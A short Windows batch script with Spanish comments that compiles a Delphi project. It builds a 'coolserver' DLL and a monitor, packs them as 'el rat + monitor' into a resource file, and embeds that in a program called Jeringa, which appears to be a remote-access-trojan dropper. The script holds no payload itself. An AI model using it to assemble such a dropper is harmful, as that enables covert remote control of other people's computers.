@echo off
set delphi=C:\Archivos de programa\Borland\Delphi7\Bin

del Jeringa.exe

echo creo coolserver.dll
"%delphi%\dcc32.exe" ..\coolserver.dpr

echo copia el coolserver del directorio inferior a este
copy ..\coolserver.dll coolserver.dll

echo Compila el Monitor
"%delphi%\dcc32.exe" Monitor.dpr

echo Crea el archivo .res con el rat + monitor
"%delphi%\brcc32.exe" MyRes.rc

echo Compila Jeringa para que incluya en su resources el MyRes.rc
"%delphi%\dcc32.exe" Jeringa.dpr 

echo limpio archivos temporales
del ..\*.dcu
del ..\*.~*
del ..\*.cfg
del ..\*.ddp
del ..\*.dof
del ..\*.tmp
del ..\jpgcool.dat
del *.dcu
del *.~*
del *.cfg
del *.ddp
del *.dof
del *.tmp
del jpgcool.dat
del *.dll